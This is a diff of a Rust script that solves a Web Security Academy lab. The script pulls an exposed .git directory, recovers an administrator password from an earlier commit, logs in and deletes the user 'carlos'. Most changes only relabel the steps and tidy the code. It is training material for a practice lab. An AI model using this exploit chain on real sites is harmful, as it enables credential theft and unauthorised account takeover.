@@ -38,14 +38,14 @@ use text_colorizer::Colorize;
 *******************/
 fn main() {
     // change this to your lab URL
-    let domain = "0a15004e03ef12cd871f1566008a007a.web-security-academy.net";
+    let domain = "0aaf0054038b82ae831778ef00990007.web-security-academy.net";
 
     // build the client that will be used for all subsequent requests
     let client = build_client();
 
     print!(
         "{} ",
-        "1. Fetching .git directory (wait 1 minute)..".white()
+        "⦗1⦘ Fetching .git directory (wait a minute)..".white()
     );
     io::stdout().flush();
 
@@ -59,21 +59,21 @@ fn main() {
         ));
 
     println!("{}", "OK".green());
-    print!("{} ", "2. Changing current working directory..".white());
+    print!("{} ", "⦗2⦘ Changing current working directory..".white());
     io::stdout().flush();
 
     // change the current working directory
-    let change_dir = env::set_current_dir(format!("{domain}")).expect(&format!(
+    env::set_current_dir(format!("{domain}")).expect(&format!(
         "{}",
         "[!] Failed to change current working directory".red()
     ));
 
     println!("{}", "OK".green());
-    print!("{} ", "3. Resetting to the previous commit..".white());
+    print!("{} ", "⦗3⦘ Resetting to the previous commit..".white());
     io::stdout().flush();
 
     // reset to the previous commit
-    let reset = process::Command::new("git")
+    process::Command::new("git")
         .args(["reset", "--hard", "HEAD~1"])
         .output()
         .expect(&format!(
@@ -82,7 +82,7 @@ fn main() {
         ));
 
     println!("{}", "OK".green());
-    print!("{} ", "4. Reading admin.conf file..".white());
+    print!("{} ", "⦗4⦘ Reading admin.conf file..".white());
     io::stdout().flush();
 
     // read admin.conf file
@@ -90,7 +90,7 @@ fn main() {
         .expect(&format!("{}", "[!] Failed to read admin.conf file".red()));
 
     println!("{}", "OK".green());
-    print!("{} ", "5. Extracting the administrator password..".white());
+    print!("{} ", "⦗5⦘ Extracting the administrator password..".white());
     io::stdout().flush();
 
     // extract admin password
@@ -105,22 +105,26 @@ fn main() {
     println!("{} => {}", "OK".green(), admin_pass.yellow());
     print!(
         "{} ",
-        "6. Fetching login page to get a valid session and csrf token..".white()
+        "⦗6⦘ Fetching login page to get a valid session and csrf token..".white()
     );
     io::stdout().flush();
 
-    // fetch login page, extract session cookie and csrf token
+    // fetch login page
     let get_login = client
         .get(format!("https://{domain}/login"))
         .send()
         .expect(&format!("{}", "[!] Failed to GET /login as admin".red()));
+
+    // extract session cookie
     let session = extract_session_cookie(get_login.headers())
         .expect(&format!("{}", "[!] Failed to extract session cookie".red()));
+
+    // extract csrf token
     let csrf =
         extract_csrf(get_login).expect(&format!("{}", "[!] Failed to extract csrf token".red()));
 
     println!("{}", "OK".green());
-    print!("{} ", "7. Logging in as administrator..".white());
+    print!("{} ", "⦗7⦘ Logging in as administrator..".white());
     io::stdout().flush();
 
     // login as admin
@@ -135,22 +139,18 @@ fn main() {
         .send()
         .expect(&format!("{}", "[!] Failed to login as admin".red()));
 
-    // if login is successful, a redirection will occurred
-    if login.status().as_u16() == 302 {
-        println!("{}", "OK".green());
-    }
-
-    // extract new session cookie
+    // extract the new session cookie
     let new_session = extract_session_cookie(login.headers()).expect(&format!(
         "{}",
-        "[!] Failed to extract new session cookie".red()
+        "[!] Failed to extract the new session cookie".red()
     ));
 
-    print!("{} ", "8. Deleting carlos..".white());
+    println!("{}", "OK".green());
+    print!("{} ", "⦗8⦘ Deleting carlos..".white());
     io::stdout().flush();
 
     // delete carlos
-    let delete_carlos = client
+    client
         .get(format!("https://{domain}/admin/delete?username=carlos"))
         .header("Cookie", format!("session={new_session}"))
         .send()
